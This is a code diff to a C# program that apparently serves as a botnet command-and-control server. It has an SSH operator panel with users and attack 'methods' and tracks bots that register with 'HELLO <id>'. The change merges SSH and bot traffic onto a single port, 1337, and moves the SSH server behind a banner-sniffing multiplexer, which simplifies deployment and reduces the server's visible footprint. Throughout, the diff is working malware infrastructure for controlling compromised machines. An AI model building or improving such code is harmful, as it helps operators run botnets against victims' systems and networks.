@@ -34,13 +34,15 @@ namespace Agent
     internal class Program
     {
         private static int _port = 1337;
-        private static int _botPort = 1338;
+        private static int _internalSshPort = 0;
         private static int _botCount = 0;
         private static List<UserConfig> _users = new();
         private static List<MethodConfig> _methods = new();
         private static readonly ConcurrentDictionary<Channel, StringBuilder> _inputBuffers = new();
         private static readonly ConcurrentDictionary<Channel, string> _channelUsers = new();
         private static readonly ConcurrentDictionary<TcpClient, NetworkStream> _botStreams = new();
+        private static readonly ConcurrentDictionary<TcpClient, bool> _activeProxyClients = new();
+        private static TcpListener? _mainListener;
 
         private static string GetTitleSequence() => $"\x1b]0;Connected {_botCount}\x07";
 
@@ -50,7 +52,13 @@ namespace Agent
             LoadUsers();
             LoadMethods();
 
-            var startingInfo = new StartingInfo(IPAddress.Any, _port, "SSH-2.0-AgentSSH");
+            // Bind internal SSH server to loopback on random free port
+            var sshListener = new TcpListener(IPAddress.Loopback, 0);
+            sshListener.Start();
+            _internalSshPort = ((IPEndPoint)sshListener.LocalEndpoint).Port;
+            sshListener.Stop();
+
+            var startingInfo = new StartingInfo(IPAddress.Loopback, _internalSshPort, "SSH-2.0-AgentSSH");
             var server = new SshServer(startingInfo);
 
             string rsaKey = GetOrGenerateKey("hostkey_rsa.pem", () => KeyGenerator.GenerateRsaKeyPem(2048));
@@ -63,8 +71,6 @@ namespace Agent
 
             server.ConnectionAccepted += (sender, session) =>
             {
-                Console.WriteLine("[+] New SSH connection accepted");
-
                 session.ServiceRegistered += (s, service) =>
                 {
                     if (service is UserAuthService auth)
@@ -80,12 +86,12 @@ namespace Agent
                                 if (matched)
                                 {
                                     authArgs.Result = true;
-                                    Console.WriteLine($"[+] Authenticated user: {authArgs.Username}");
+                                    Console.WriteLine($"[+] Authenticated SSH user: {authArgs.Username}");
                                 }
                                 else
                                 {
                                     authArgs.Result = false;
-                                    Console.WriteLine($"[-] Failed password authentication for user: {authArgs.Username}");
+                                    Console.WriteLine($"[-] Failed SSH password authentication for user: {authArgs.Username}");
                                 }
                             }
                             else if (authArgs.AuthMethod == "none")
@@ -139,45 +145,144 @@ namespace Agent
             };
 
             server.Start();
-            Console.WriteLine($"[+] SSH Agent listening on port {_port}...");
 
-            var botListenerThread = new Thread(StartBotListener) { IsBackground = true };
-            botListenerThread.Start();
+            // Start Unified Port Listener (SSH & Bot Multiplexer on single port)
+            var mainListenerThread = new Thread(() => StartMultiplexListener(_port)) { IsBackground = true };
+            mainListenerThread.Start();
 
+            Console.WriteLine($"[+] Single Port Multiplexer active on port {_port} (SSH & Bot unified)");
             Console.WriteLine("[+] Press Ctrl+C to stop.");
 
             var waitHandle = new ManualResetEvent(false);
             Console.CancelKeyPress += (s, e) =>
             {
                 e.Cancel = true;
+                _mainListener?.Stop();
                 server.Stop();
                 waitHandle.Set();
             };
             waitHandle.WaitOne();
         }
 
-        private static void StartBotListener()
+        private static void StartMultiplexListener(int port)
         {
             try
             {
-                var listener = new TcpListener(IPAddress.Any, _botPort);
-                listener.Start();
-                Console.WriteLine($"[+] Bot TCP listener started on port {_botPort}...");
+                _mainListener = new TcpListener(IPAddress.Any, port);
+                _mainListener.Start();
 
                 while (true)
                 {
-                    var client = listener.AcceptTcpClient();
-                    var botThread = new Thread(() => HandleBotClient(client)) { IsBackground = true };
-                    botThread.Start();
+                    var client = _mainListener.AcceptTcpClient();
+                    var th = new Thread(() => RouteIncomingConnection(client)) { IsBackground = true };
+                    th.Start();
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine($"[!] Bot TCP listener error: {ex.Message}");
+                Console.WriteLine($"[!] Main multiplexer listener stopped: {ex.Message}");
             }
         }
 
-        private static void HandleBotClient(TcpClient client)
+        private static void RouteIncomingConnection(TcpClient client)
+        {
+            try
+            {
+                var stream = client.GetStream();
+                stream.ReadTimeout = 10000;
+
+                // Send SSH banner first (SSH protocol: server sends banner first)
+                // This causes SSH clients to respond with their own SSH banner
+                // Bot clients will respond with "HELLO <id>"
+                byte[] banner = Encoding.UTF8.GetBytes("SSH-2.0-AgentSSH\r\n");
+                stream.Write(banner, 0, banner.Length);
+
+                // Read client's response to determine type
+                var readBuffer = new byte[256];
+                int n = stream.Read(readBuffer, 0, readBuffer.Length);
+
+                stream.ReadTimeout = 0;
+
+                if (n <= 0)
+                {
+                    client.Close();
+                    return;
+                }
+
+                // If client responded with SSH banner, route to internal SSH server
+                if (n >= 4 &&
+                    readBuffer[0] == (byte)'S' &&
+                    readBuffer[1] == (byte)'S' &&
+                    readBuffer[2] == (byte)'H' &&
+                    readBuffer[3] == (byte)'-')
+                {
+                    ProxyToInternalSsh(client, readBuffer, n);
+                }
+                else
+                {
+                    // Bot client - handle directly, pass pre-read data
+                    HandleBotClient(client, stream, readBuffer, n);
+                }
+            }
+            catch
+            {
+                try { client.Close(); } catch { }
+            }
+        }
+
+        private static void ProxyToInternalSsh(TcpClient externalClient, byte[] prefixData, int prefixLen)
+        {
+            TcpClient? internalClient = null;
+            try
+            {
+                internalClient = new TcpClient();
+                internalClient.Connect(IPAddress.Loopback, _internalSshPort);
+
+                _activeProxyClients[externalClient] = true;
+                _activeProxyClients[internalClient] = true;
+
+                var extStream = externalClient.GetStream();
+                var intStream = internalClient.GetStream();
+
+                // Forward the SSH banner that was already read from external client to internal SSH server
+                intStream.Write(prefixData, 0, prefixLen);
+
+                var t1 = Task.Run(() => StreamCopy(extStream, intStream, externalClient, internalClient));
+                var t2 = Task.Run(() => StreamCopy(intStream, extStream, internalClient, externalClient));
+
+                Task.WaitAny(t1, t2);
+            }
+            catch
+            {
+                try { externalClient.Close(); } catch { }
+                try { internalClient?.Close(); } catch { }
+            }
+        }
+
+        private static void StreamCopy(NetworkStream from, NetworkStream to, TcpClient c1, TcpClient c2)
+        {
+            byte[] buf = new byte[4096];
+            try
+            {
+                int read;
+                while ((read = from.Read(buf, 0, buf.Length)) > 0)
+                {
+                    to.Write(buf, 0, read);
+                }
+            }
+            catch
+            {
+            }
+            finally
+            {
+                _activeProxyClients.TryRemove(c1, out _);
+                _activeProxyClients.TryRemove(c2, out _);
+                try { c1.Close(); } catch { }
+                try { c2.Close(); } catch { }
+            }
+        }
+
+        private static void HandleBotClient(TcpClient client, NetworkStream stream, byte[] initialData, int initialLen)
         {
             Interlocked.Increment(ref _botCount);
             UpdateConnectedTitle();
@@ -185,11 +290,18 @@ namespace Agent
 
             try
             {
-                using var stream = client.GetStream();
                 _botStreams[client] = stream;
                 stream.ReadTimeout = 45000;
-                var buffer = new byte[1024];
 
+                // Process the initial data already read during routing
+                string firstMsg = Encoding.UTF8.GetString(initialData, 0, initialLen).Trim();
+                if (firstMsg.StartsWith("HELLO "))
+                {
+                    botId = firstMsg.Substring(6).Trim();
+                    Console.WriteLine($"[+] Bot connected: {botId} (Total: {_botCount})");
+                }
+
+                var buffer = new byte[1024];
                 while (client.Connected)
                 {
                     int bytesRead = stream.Read(buffer, 0, buffer.Length);
@@ -246,15 +358,6 @@ namespace Agent
                     if (int.TryParse(args[i + 1], out int p))
                     {
                         _port = p;
-                        _botPort = p + 1;
-                        i++;
-                    }
-                }
-                else if ((args[i] == "-b" || args[i] == "--bot-port") && i + 1 < args.Length)
-                {
-                    if (int.TryParse(args[i + 1], out int bp))
-                    {
-                        _botPort = bp;
                         i++;
                     }
                 }
